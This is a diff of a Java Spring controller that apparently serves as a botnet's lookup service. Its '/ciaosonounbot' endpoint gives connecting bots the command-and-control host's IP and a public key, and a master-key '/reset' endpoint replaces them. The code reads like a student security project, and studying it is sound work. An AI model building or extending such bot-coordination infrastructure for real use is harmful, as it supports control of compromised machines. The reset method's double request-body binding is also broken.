@@ -4,6 +4,7 @@ import org.springframework.web.servlet.ModelAndView;
 import cs.sii.dns.domain.IP;
 import cs.sii.dns.domain.Pairs;
 
+import java.io.IOException;
 import java.security.KeyFactory;
 import java.security.NoSuchAlgorithmException;
 import java.security.NoSuchProviderException;
@@ -12,6 +13,8 @@ import java.security.spec.InvalidKeySpecException;
 import java.security.spec.X509EncodedKeySpec;
 
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
 import org.apache.commons.codec.binary.Base64;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
@@ -29,14 +32,16 @@ public class DNSController {
 	@Autowired
 	public IP ipCec;
 
-	//TODO RESPONSEBODY?
-	//TODO SE FAI LA REQ CRASHA CON NULLPOINTEREXEPTION; AGGIUNGO THROWS?
 	@RequestMapping(value = "/ciaosonounbot")
-	public Pairs<IP, String> connectBot(HttpServletRequest req) {
+	public Pairs<IP, String> connectBot(HttpServletRequest req, HttpServletResponse error) throws IOException {
 		Pairs<IP, String> answ = new Pairs<IP, String>();
-		answ.setValue1(ipCec);
-		String key = Base64.encodeBase64String(pubKey.getEncoded());
-		answ.setValue2(key);
+		if(pubKey!=null){
+			answ.setValue1(ipCec);
+			String key = Base64.encodeBase64String(pubKey.getEncoded());
+			answ.setValue2(key);
+		} else {
+			error.setHeader("Location", "/error");
+		}
 		return answ;
 	}
 
@@ -62,8 +67,8 @@ public class DNSController {
 	
 	//TODO è diventato post così sparisce 200 e la pagina non è contattabile
 	//TODO ognuno dovrebbe avere la coppia di default encodada e me la manda al reset
-	@RequestMapping(value = "/reset/{resetKey}", method = RequestMethod.POST)
-	public Boolean reset(@PathVariable String resetKey, @RequestBody Pairs<IP, String> cec, HttpServletRequest req){
+	@RequestMapping(value = "/reset", method = RequestMethod.POST)
+	public Boolean reset(@RequestBody String resetKey, @RequestBody Pairs<IP, String> cec, HttpServletRequest req){
 		if(resetKey.equals(resetMasterKey)){
 			//TODO incolla da sopra keyfactory, byte, pubkey
 			//ipCec.setIp(defaultIp);
